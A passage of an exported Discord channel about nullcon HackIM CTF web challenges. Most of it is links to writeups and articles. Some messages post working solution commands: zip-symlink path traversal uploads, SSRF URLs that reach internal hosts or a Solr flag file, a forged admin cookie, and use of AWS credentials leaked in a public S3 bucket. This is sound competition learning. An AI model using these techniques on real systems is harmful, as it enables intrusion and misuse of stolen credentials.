+The following 7 hash-modes match the structure of your input hash:
+
+      # | Name                                                       | Category
+  ======+============================================================+======================================
+    100 | SHA1                                                       | Raw Hash
+   6000 | RIPEMD-160                                                 | Raw Hash
+    170 | sha1(utf16le($pass))                                       | Raw Hash
+   4700 | sha1(md5($pass))                                           | Raw Hash salted and/or iterated
+  18500 | sha1(md5(md5($pass)))                                      | Raw Hash salted and/or iterated
+   4500 | sha1(sha1($pass))                                          | Raw Hash salted and/or iterated
+    300 | MySQL4.1/MySQL5                                            | Database Server
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-20T06:47:36.634000+00:00</span>
+      <div class="content"><a href="https://github.com/Cooperw/ctf/blob/master/2023-08-20-nullcon/colorful/README.md" target="_blank">https://github.com/Cooperw/ctf/blob/master/2023-08-20-nullcon/colorful/README.md</a>
+^here's my colorful solution</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-20T06:44:08.528000+00:00</span>
+      <div class="content">I Didnt, I Used Any Hash From &lt;<a href="https://github.com/spaze/hashes/blob/master/sha1.md&gt;" target="_blank">https://github.com/spaze/hashes/blob/master/sha1.md&gt;</a> To Get 0</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-20T06:32:22.424000+00:00</span>
+      <div class="content">Any Plaintext From &lt;<a href="https://github.com/spaze/hashes/blob/master/sha1.md&gt;" target="_blank">https://github.com/spaze/hashes/blob/master/sha1.md&gt;</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-20T06:31:33.389000+00:00</span>
+      <div class="content"><a href="http://52.59.124.14:10019/?src&amp;debug_filter&amp;fetch_backend&amp;bip=5.9.68.120" target="_blank">http://52.59.124.14:10019/?src&amp;debug_filter&amp;fetch_backend&amp;bip=5.9.68.120</a>
+The vm listens on port 80 and responds with a HTTP 302 to <a href="http://192.168.112.2/" target="_blank">http://192.168.112.2/</a> with <a href="https://stackoverflow.com/questions/2506932/how-do-i-redirect-a-request-to-a-different-url-in-python#answer-47084250" target="_blank">https://stackoverflow.com/questions/2506932/how-do-i-redirect-a-request-to-a-different-url-in-python#answer-47084250</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-20T06:24:27.006000+00:00</span>
+      <div class="content"><a href="http://52.59.124.14:10019/?fetch_backend=1&amp;bip=192.168.112.002" target="_blank">http://52.59.124.14:10019/?fetch_backend=1&amp;bip=192.168.112.002</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-20T06:12:20.640000+00:00</span>
+      <div class="content"><a href="https://tenor.com/view/jonah-hill-annoyed-gif-11134341" target="_blank">https://tenor.com/view/jonah-hill-annoyed-gif-11134341</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-19T14:12:11.066000+00:00</span>
+      <div class="content"><a href="https://tenor.com/view/thats-not-the-point-terry-carson-the-ms-pat-show-youre-missing-the-point-thats-not-what-im-saying-gif-22684026" target="_blank">https://tenor.com/view/thats-not-the-point-terry-carson-the-ms-pat-show-youre-missing-the-point-thats-not-what-im-saying-gif-22684026</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-19T13:23:33.112000+00:00</span>
+      <div class="content"><a href="https://media.discordapp.net/attachments/831244432581722152/892747397002846218/9120315_20200729034559_2.gif" target="_blank">https://media.discordapp.net/attachments/831244432581722152/892747397002846218/9120315_20200729034559_2.gif</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-19T13:11:50.873000+00:00</span>
+      <div class="content"><a href="https://tenor.com/view/yep-oh-yeah-gif-26021474" target="_blank">https://tenor.com/view/yep-oh-yeah-gif-26021474</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-19T10:15:40.597000+00:00</span>
+      <div class="content"><a href="https://tenor.com/view/hug-me-im-sad-sad-girl-gif-24456547" target="_blank">https://tenor.com/view/hug-me-im-sad-sad-girl-gif-24456547</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-03-10T18:20:36.568000+00:00</span>
+      <div class="content">you can sanity check with something like `curl <a href="http://52.59.124.14:10014/" target="_blank">http://52.59.124.14:10014/</a> --cookie "role=admin;really=yes"` if you still don't get the flag, there's something wrong with your setup</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-03-10T15:16:24.104000+00:00</span>
+      <div class="content">my solution for zpr
+touch hack
+ln -sfn ../../../flag hack
+zip --symlink konchan.zip hack
+```import requests
+url="<a href="http://52.59.124.14:10015"" target="_blank">http://52.59.124.14:10015"</a>
+files = {'file': open('/home/hackervnn40/konchan.zip', 'rb')}
+getdata = requests.post(url, files=files)
+print(getdata.text)
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-03-10T15:13:25.057000+00:00</span>
+      <div class="content">You have this one :
+<a href="https://discord.com/channels/666188272103325716/666188462038450176/1083707315133370428" target="_blank">https://discord.com/channels/666188272103325716/666188462038450176/1083707315133370428</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-03-10T11:05:58.236000+00:00</span>
+      <div class="content">zpr:
+
+```
+ln -sfn ../../../flag x
+zip a.zip x --symlink
+curl -F "file=@a.zip" <a href="http://52.59.124.14:10015/" target="_blank">http://52.59.124.14:10015/</a>
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-03-10T11:00:40.212000+00:00</span>
+      <div class="content"><a href="http://52.59.124.14:10016/" target="_blank">http://52.59.124.14:10016/</a> is this down or that's the challenge?</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-02-02T11:56:09.397000+00:00</span>
+      <div class="content"><a href="https://shahjerry33.medium.com/idor-inside-the-session-storage-88af485fc899" target="_blank">https://shahjerry33.medium.com/idor-inside-the-session-storage-88af485fc899</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-01-19T13:11:27.960000+00:00</span>
+      <div class="content"><a href="https://shahjerry33.medium.com/api-misconfiguration-no-swag-of-swaggerui-9b43135346be" target="_blank">https://shahjerry33.medium.com/api-misconfiguration-no-swag-of-swaggerui-9b43135346be</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-12-03T11:40:39.741000+00:00</span>
+      <div class="content"><a href="https://shahjerry33.medium.com/account-takeover-inside-the-tenant-6101a3cafbee" target="_blank">https://shahjerry33.medium.com/account-takeover-inside-the-tenant-6101a3cafbee</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-09-29T13:12:28.066000+00:00</span>
+      <div class="content"><a href="https://shahjerry33.medium.com/shodan-dorks-the-gods-eye-f224f9b3984f" target="_blank">https://shahjerry33.medium.com/shodan-dorks-the-gods-eye-f224f9b3984f</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-08-15T13:04:25.206000+00:00</span>
+      <div class="content"><a href="https://canary.discord.com/channels/666188272103325716/666188462038450176/1008305176978931763" target="_blank">https://canary.discord.com/channels/666188272103325716/666188462038450176/1008305176978931763</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-08-14T12:00:25.638000+00:00</span>
+      <div class="content">The website's Source code contains reference to SVG image: <a href="https://nullcon-static-content-public-bucket.s3.eu-central-1.amazonaws.com/sec-consult.svg" target="_blank">https://nullcon-static-content-public-bucket.s3.eu-central-1.amazonaws.com/sec-consult.svg</a>
+
+The image is hosted on public s3 bucket: <a href="https://nullcon-static-content-public-bucket.s3.eu-central-1.amazonaws.com." target="_blank">https://nullcon-static-content-public-bucket.s3.eu-central-1.amazonaws.com.</a> All hosted files is readable
+AWS credentials are present in: <a href="https://nullcon-static-content-public-bucket.s3.eu-central-1.amazonaws.com/.boto" target="_blank">https://nullcon-static-content-public-bucket.s3.eu-central-1.amazonaws.com/.boto</a>
+
+Configure AWS cli using these creds, and run: aws sts get-caller-identity.
+
+The username from "arn" in the output is the flag</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-08-14T08:16:11.985000+00:00</span>
+      <div class="content">Haha I made similar exploit
+ <a href="https://gist.github.com/heapbytes/0fbf32340c6ffe4c2f357725d2faad14" target="_blank">https://gist.github.com/heapbytes/0fbf32340c6ffe4c2f357725d2faad14</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-08-13T11:35:51.902000+00:00</span>
+      <div class="content"><a href="https://tenor.com/view/computer-drinking-bird-keyboard-the-simpsons-gif-8025433" target="_blank">https://tenor.com/view/computer-drinking-bird-keyboard-the-simpsons-gif-8025433</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-08-13T09:57:21.586000+00:00</span>
+      <div class="content"><a href="http://3.64.214.139/?calc_input=9*9" target="_blank">http://3.64.214.139/?calc_input=9*9</a> is down!</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-08-13T07:33:27.104000+00:00</span>
+      <div class="content">Is it down? <a href="http://52.59.124.14:10002/" target="_blank">http://52.59.124.14:10002/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-08-13T06:49:23.387000+00:00</span>
+      <div class="content"><a href="http://52.59.124.14:10004/" target="_blank">http://52.59.124.14:10004/</a> too</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-08-13T06:49:09.114000+00:00</span>
+      <div class="content">Is it down? <a href="http://52.59.124.14:10003/" target="_blank">http://52.59.124.14:10003/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-26T11:58:37.899000+00:00</span>
+      <div class="content"><a href="https://shahjerry33.medium.com/http-parameter-pollution-its-contaminated-again-95c75b0295e1" target="_blank">https://shahjerry33.medium.com/http-parameter-pollution-its-contaminated-again-95c75b0295e1</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-06-22T13:14:25.559000+00:00</span>
+      <div class="content"><a href="https://shahjerry33.medium.com/social-engineering-a-50-euro-bug-fee0a1be76b9" target="_blank">https://shahjerry33.medium.com/social-engineering-a-50-euro-bug-fee0a1be76b9</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-05-04T11:42:27.101000+00:00</span>
+      <div class="content"><a href="https://shahjerry33.medium.com/business-logic-errors-art-of-testing-cards-4907cfb46a57" target="_blank">https://shahjerry33.medium.com/business-logic-errors-art-of-testing-cards-4907cfb46a57</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-04-12T12:04:16.606000+00:00</span>
+      <div class="content"><a href="https://shahjerry33.medium.com/xss-the-localstorage-robbery-d5fbf353c6b0" target="_blank">https://shahjerry33.medium.com/xss-the-localstorage-robbery-d5fbf353c6b0</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-04-09T17:24:56.076000+00:00</span>
+      <div class="content"><a href="https://0xgodson.me/blogs/2022-04-09-path-traversal-via-join/" target="_blank">https://0xgodson.me/blogs/2022-04-09-path-traversal-via-join/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-04-09T16:52:59.890000+00:00</span>
+      <div class="content">Good article on LaTeX (I think) - <a href="https://0day.work/hacking-with-latex/" target="_blank">https://0day.work/hacking-with-latex/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-04-09T15:38:16.307000+00:00</span>
+      <div class="content"><a href="https://cyberseclwahch.wordpress.com/2022/04/09/hackim-2022-capture-the-flag/" target="_blank">https://cyberseclwahch.wordpress.com/2022/04/09/hackim-2022-capture-the-flag/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-04-09T13:12:58.563000+00:00</span>
+      <div class="content">Documentation for `os.path` - <a href="https://docs.python.org/3/library/os.path.html#os.path.join" target="_blank">https://docs.python.org/3/library/os.path.html#os.path.join</a> 
+```
+If a component is an absolute path, all previous components are thrown away and joining continues from the absolute path component.
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-03-22T02:42:19.090000+00:00</span>
+      <div class="content">&lt;@526623510668247043&gt; <a href="https://pentestbook.six2dez.com/others/web-checklist" target="_blank">https://pentestbook.six2dez.com/others/web-checklist</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-03-17T12:54:28.841000+00:00</span>
+      <div class="content"><a href="https://shahjerry33.medium.com/parameter-pollution-zero-day-3feb86ee8a02" target="_blank">https://shahjerry33.medium.com/parameter-pollution-zero-day-3feb86ee8a02</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-02-13T11:48:26.955000+00:00</span>
+      <div class="content"><a href="https://shahjerry33.medium.com/broken-link-hijacking-mr-user-agent-cd124297f6e6" target="_blank">https://shahjerry33.medium.com/broken-link-hijacking-mr-user-agent-cd124297f6e6</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-01-04T11:51:53.316000+00:00</span>
+      <div class="content"><a href="https://shahjerry33.medium.com/sql-injection-the-file-upload-playground-6580b089d013" target="_blank">https://shahjerry33.medium.com/sql-injection-the-file-upload-playground-6580b089d013</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-12-11T12:02:43.136000+00:00</span>
+      <div class="content"><a href="https://shahjerry33.medium.com/open-redirection-qr-code-magic-18ace1a0170f" target="_blank">https://shahjerry33.medium.com/open-redirection-qr-code-magic-18ace1a0170f</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-10-16T14:08:40.042000+00:00</span>
+      <div class="content"><a href="https://shahjerry33.medium.com/business-logic-errors-a-logic-destruction-477c4ebc824b" target="_blank">https://shahjerry33.medium.com/business-logic-errors-a-logic-destruction-477c4ebc824b</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-09-25T12:19:34.392000+00:00</span>
+      <div class="content"><a href="https://shahjerry33.medium.com/google-dorks-a-tracker-a59c7aad237f" target="_blank">https://shahjerry33.medium.com/google-dorks-a-tracker-a59c7aad237f</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-09-04T11:39:52.195000+00:00</span>
+      <div class="content"><a href="https://shahjerry33.medium.com/business-logic-errors-must-vote-68f642b60fb7" target="_blank">https://shahjerry33.medium.com/business-logic-errors-must-vote-68f642b60fb7</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-18T11:34:41.403000+00:00</span>
+      <div class="content"><a href="https://shahjerry33.medium.com/rce-via-webdav-power-of-put-7e1c06c71e60" target="_blank">https://shahjerry33.medium.com/rce-via-webdav-power-of-put-7e1c06c71e60</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-06-24T13:59:00.388000+00:00</span>
+      <div class="content"><a href="https://shahjerry33.medium.com/pii-leakage-revealing-secrets-8b617071bd1c" target="_blank">https://shahjerry33.medium.com/pii-leakage-revealing-secrets-8b617071bd1c</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-06-02T12:52:34.922000+00:00</span>
+      <div class="content"><a href="https://shahjerry33.medium.com/server-side-request-forgery-a-forged-document-6359ef25058d" target="_blank">https://shahjerry33.medium.com/server-side-request-forgery-a-forged-document-6359ef25058d</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-04-18T11:38:06.385000+00:00</span>
+      <div class="content"><a href="https://shahjerry33.medium.com/xss-via-exif-data-the-p2-elevator-d09e7b7fe9b9" target="_blank">https://shahjerry33.medium.com/xss-via-exif-data-the-p2-elevator-d09e7b7fe9b9</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-03-21T11:34:32.873000+00:00</span>
+      <div class="content"><a href="https://shahjerry33.medium.com/cross-site-port-attack-a-strangers-call-c2467f93792f" target="_blank">https://shahjerry33.medium.com/cross-site-port-attack-a-strangers-call-c2467f93792f</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-03-11T12:21:31.178000+00:00</span>
+      <div class="content"><a href="https://shahjerry33.medium.com/business-logic-errors-the-failed-logic-4dc500886ccf" target="_blank">https://shahjerry33.medium.com/business-logic-errors-the-failed-logic-4dc500886ccf</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-03-01T09:44:08.555000+00:00</span>
+      <div class="content"><a href="https://satyavachanbyshubham.blogspot.com/2021/03/cryptocurrencies-reliable-investment.html" target="_blank">https://satyavachanbyshubham.blogspot.com/2021/03/cryptocurrencies-reliable-investment.html</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-02-25T12:37:52.181000+00:00</span>
+      <div class="content"><a href="https://shahjerry33.medium.com/account-takeover-smoking-with-null-e43df2c3bb41" target="_blank">https://shahjerry33.medium.com/account-takeover-smoking-with-null-e43df2c3bb41</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-02-08T12:57:57.859000+00:00</span>
+      <div class="content"><a href="https://shahjerry33.medium.com/duplicate-registration-the-twinning-twins-883dfee59eaf" target="_blank">https://shahjerry33.medium.com/duplicate-registration-the-twinning-twins-883dfee59eaf</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-01-12T11:07:51.981000+00:00</span>
+      <div class="content"><a href="https://shahjerry33.medium.com/csrf-with-idor-a-deadly-combo-203e93967702" target="_blank">https://shahjerry33.medium.com/csrf-with-idor-a-deadly-combo-203e93967702</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-12-06T12:20:26.222000+00:00</span>
+      <div class="content"><a href="https://shahjerry33.medium.com/rce-via-lfi-log-poisoning-the-death-potion-c0831cebc16d" target="_blank">https://shahjerry33.medium.com/rce-via-lfi-log-poisoning-the-death-potion-c0831cebc16d</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-11-18T11:36:40.644000+00:00</span>
+      <div class="content"><a href="https://shahjerry33.medium.com/server-side-misconfigurartion-a-funny-fix-63cc12b4c7fc" target="_blank">https://shahjerry33.medium.com/server-side-misconfigurartion-a-funny-fix-63cc12b4c7fc</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-10-27T03:36:43.186000+00:00</span>
+      <div class="content"><a href="https://shahjerry33.medium.com/recon-my-way-or-high-way-58a18dab5c95" target="_blank">https://shahjerry33.medium.com/recon-my-way-or-high-way-58a18dab5c95</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-10-24T04:27:05.585000+00:00</span>
+      <div class="content"><a href="https://medium.com/@shahjerry33/blind-ssrf-the-hide-seek-game-da9d0ecef2fb" target="_blank">https://medium.com/@shahjerry33/blind-ssrf-the-hide-seek-game-da9d0ecef2fb</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-10-21T20:32:51.578000+00:00</span>
+      <div class="content"><a href="https://medium.com/@shahjerry33/github-recon-its-really-deep-6553d6dfbb1f" target="_blank">https://medium.com/@shahjerry33/github-recon-its-really-deep-6553d6dfbb1f</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-12T02:26:55.288000+00:00</span>
+      <div class="content">Hi &lt;@170842920541356033&gt; <a href="https://github.com/nullcon/hackim-2020/tree/master/web" target="_blank">https://github.com/nullcon/hackim-2020/tree/master/web</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-10T07:23:04.663000+00:00</span>
+      <div class="content">&lt;@299367347922403328&gt; <a href="https://github.com/nullcon/hackim-2020/tree/master/web" target="_blank">https://github.com/nullcon/hackim-2020/tree/master/web</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-09T14:14:41.406000+00:00</span>
+      <div class="content">&lt;@236391314864734209&gt; <a href="https://github.com/nullcon/hackim-2020/tree/master/web/split_second" target="_blank">https://github.com/nullcon/hackim-2020/tree/master/web/split_second</a> this is official writeup</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-09T13:02:10.615000+00:00</span>
+      <div class="content">&lt;@!235995468511969280&gt; <a href="https://github.com/nullcon/hackim-2020/tree/master/web/split_second" target="_blank">https://github.com/nullcon/hackim-2020/tree/master/web/split_second</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-09T12:13:48.648000+00:00</span>
+      <div class="content"><a href="https://www.npmjs.com/package/express-http-proxy" target="_blank">https://www.npmjs.com/package/express-http-proxy</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-09T12:11:59.924000+00:00</span>
+      <div class="content"><a href="https://github.com/nullcon/hackim-2020/blob/master/web/lateral_Movement/server.js" target="_blank">https://github.com/nullcon/hackim-2020/blob/master/web/lateral_Movement/server.js</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-09T11:40:48.943000+00:00</span>
+      <div class="content"><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" target="_blank">https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-09T11:36:46.832000+00:00</span>
+      <div class="content"><a href="https://hackerone.com/reports/508459" target="_blank">https://hackerone.com/reports/508459</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-09T10:36:24.895000+00:00</span>
+      <div class="content">&lt;@!565200851187007508&gt; <a href="https://github.com/nullcon/hackim-2020/tree/master/web/solar-energy" target="_blank">https://github.com/nullcon/hackim-2020/tree/master/web/solar-energy</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-09T09:51:43.484000+00:00</span>
+      <div class="content"><a href="https://github.com/nullcon/hackim-2020/blob/master/web/split_second/index.html" target="_blank">https://github.com/nullcon/hackim-2020/blob/master/web/split_second/index.html</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-09T09:06:18.088000+00:00</span>
+      <div class="content">&lt;@639749913583812608&gt; all writrups are here <a href="https://github.com/nullcon/hackim-2020/" target="_blank">https://github.com/nullcon/hackim-2020/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-09T07:04:27.149000+00:00</span>
+      <div class="content"><a href="https://github.com/nullcon/hackim-2020/" target="_blank">https://github.com/nullcon/hackim-2020/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-09T05:36:26.528000+00:00</span>
+      <div class="content">Push writeups to <a href="https://ctftime.org/event/962/tasks/" target="_blank">https://ctftime.org/event/962/tasks/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-09T05:28:06.042000+00:00</span>
+      <div class="content"><a href="https://github.com/nullcon/hackim-2020/" target="_blank">https://github.com/nullcon/hackim-2020/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-09T05:27:31.208000+00:00</span>
+      <div class="content">&lt;@!673390831800942593&gt; <a href="https://github.com/nullcon/hackim-2020/tree/master/web" target="_blank">https://github.com/nullcon/hackim-2020/tree/master/web</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-09T05:24:17.656000+00:00</span>
+      <div class="content">found <a href="https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20presentations/DEFCON-27-Michael-Stepankin-Apache-Solr-Injection.pdf" target="_blank">https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20presentations/DEFCON-27-Michael-Stepankin-Apache-Solr-Injection.pdf</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-09T05:14:45.277000+00:00</span>
+      <div class="content">&lt;@456226577798135808&gt; so this? <a href="https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/" target="_blank">https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-09T05:07:58.299000+00:00</span>
+      <div class="content"><a href="https://form.jotform.com/200383994225458'" target="_blank">https://form.jotform.com/200383994225458'</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-09T05:03:34.358000+00:00</span>
+      <div class="content"><a href="https://github.com/nullcon/hackim-2020" target="_blank">https://github.com/nullcon/hackim-2020</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-09T05:02:02.797000+00:00</span>
+      <div class="content">`<a href="http://web3.ctf.nullcon.net:8080/search.php?search=a&amp;shards=http://localhost:8983/solr/SeCrEtSeArCh8888/admin/file?wt=json&amp;file=flag.txt&amp;contentType=text/plain`" target="_blank">http://web3.ctf.nullcon.net:8080/search.php?search=a&amp;shards=http://localhost:8983/solr/SeCrEtSeArCh8888/admin/file?wt=json&amp;file=flag.txt&amp;contentType=text/plain`</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-09T05:01:45.508000+00:00</span>
+      <div class="content"><a href="https://github.com/nullcon/hackim-2020" target="_blank">https://github.com/nullcon/hackim-2020</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-08T12:41:50.294000+00:00</span>
+      <div class="content"><a href="https://tenor.com/view/dance-dancing-hearts-happy-kiss-gif-9942838" target="_blank">https://tenor.com/view/dance-dancing-hearts-happy-kiss-gif-9942838</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-08T12:41:21.239000+00:00</span>
+      <div class="content"><a href="https://tenor.com/view/tonton-tonton-sticker-no-nope-gif-13636081" target="_blank">https://tenor.com/view/tonton-tonton-sticker-no-nope-gif-13636081</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-08T10:23:54.378000+00:00</span>
+      <div class="content">&lt;@!629496223941918721&gt; url has been updated to <a href="http://3.12.166.246:3000/" target="_blank">http://3.12.166.246:3000/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-08T07:14:20.204000+00:00</span>
+      <div class="content"><a href="https://giphy.com/gifs/QdjjW71YLrzWg" target="_blank">https://giphy.com/gifs/QdjjW71YLrzWg</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-08T06:11:21.878000+00:00</span>
+      <div class="content"><a href="https://giphy.com/gifs/after-effects-jupiter-orb-ozdU8Q7i6tQDdQbTR3" target="_blank">https://giphy.com/gifs/after-effects-jupiter-orb-ozdU8Q7i6tQDdQbTR3</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-08T05:58:44.964000+00:00</span>
+      <div class="content">real hackers use this - <a href="https://www.hhkeyboard.com/uk/" target="_blank">https://www.hhkeyboard.com/uk/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-08T02:19:31.982000+00:00</span>
+      <div class="content"><a href="http://web2.ctf.nullcon.net:8081/" target="_blank">http://web2.ctf.nullcon.net:8081/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-07T19:03:13.641000+00:00</span>
+      <div class="content"><a href="https://giphy.com/gifs/love-cute-panda-heart-VInghBdi0Ym9XJghC0" target="_blank">https://giphy.com/gifs/love-cute-panda-heart-VInghBdi0Ym9XJghC0</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-07T17:17:23.992000+00:00</span>
+      <div class="content">&gt; <a href="http://web3.ctf.nullcon.net:8080/" target="_blank">http://web3.ctf.nullcon.net:8080/</a> is not loading
+&lt;@!660514514760106002&gt; This is by design</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-07T17:17:22.141000+00:00</span>
+      <div class="content"><a href="http://web3.ctf.nullcon.net:8080/" target="_blank">http://web3.ctf.nullcon.net:8080/</a>
+
+not loading :(</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-07T17:15:43.742000+00:00</span>
+      <div class="content">&gt; <a href="https://web1.ctf.nullcon.net:8443/" target="_blank">https://web1.ctf.nullcon.net:8443/</a>
+
+Still not working</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-07T17:14:27.769000+00:00</span>
+      <div class="content"><a href="http://web3.ctf.nullcon.net:8080/" target="_blank">http://web3.ctf.nullcon.net:8080/</a> is not loading</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-07T16:04:29.444000+00:00</span>
+      <div class="content">&gt; in cryptography? ala (<a href="https://en.wikipedia.org/wiki/Timing_attack)" target="_blank">https://en.wikipedia.org/wiki/Timing_attack)</a> Im new to this-- I usually do the linux based stuff
+&lt;@!247396367746596874&gt; I think, I'd read it somewhere for determining smth. juicy via timing attack (side channel)</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-07T16:02:15.578000+00:00</span>
+      <div class="content">in cryptography? ala (<a href="https://en.wikipedia.org/wiki/Timing_attack)" target="_blank">https://en.wikipedia.org/wiki/Timing_attack)</a> Im new to this-- I usually do the linux based stuff</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-07T15:56:24.809000+00:00</span>
+      <div class="content"><a href="https://ctf.nullcon.net/" target="_blank">https://ctf.nullcon.net/</a> ...  there is even a timer on the website</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2020-02-05T00:09:38.530000+00:00</span>
+      <div class="content"><a href="https://jaimelightfoot.com/blog/so-you-want-to-ctf-a-beginners-guide/" target="_blank">https://jaimelightfoot.com/blog/so-you-want-to-ctf-a-beginners-guide/</a></div>
+    </div>
+  </div>
+  <h3>Gemini Chat Summary</h3>
+  <section id="summary">
+<div id="ctf-summary-container" style="font-family: Arial, sans-serif; line-height: 1.6; color: #333;">
+
+    <style>
+        #ctf-summary-container h2,
+        #ctf-summary-container h3,
+        #ctf-summary-container h4 {
+            color: #2c3e50;
+            border-bottom: 2px solid #ecf0f1;
+            padding-bottom: 10px;
+        }
+
+        #ctf-summary-container h2 {
+            font-size: 2em;
+        }
+
+        #ctf-summary-container h3 {
+            font-size: 1.5em;
+            margin-top: 20px;
+        }
+
+        #ctf-summary-container h4 {
+            font-size: 1.2em;
+            margin-top: 15px;
+            color: #34495e;
+            border-bottom: none;
+        }
+
+        #ctf-summary-container .challenge {
+            background-color: #fdfdfd;
+            border: 1px solid #ecf0f1;
+            border-radius: 5px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+
+        #ctf-summary-container code {
+            background-color: #ecf0f1;
+            color: #c0392b;
+            padding: 2px 5px;
+            border-radius: 3px;
+            font-family: 'Courier New', Courier, monospace;
+        }
+
+        #ctf-summary-container pre {
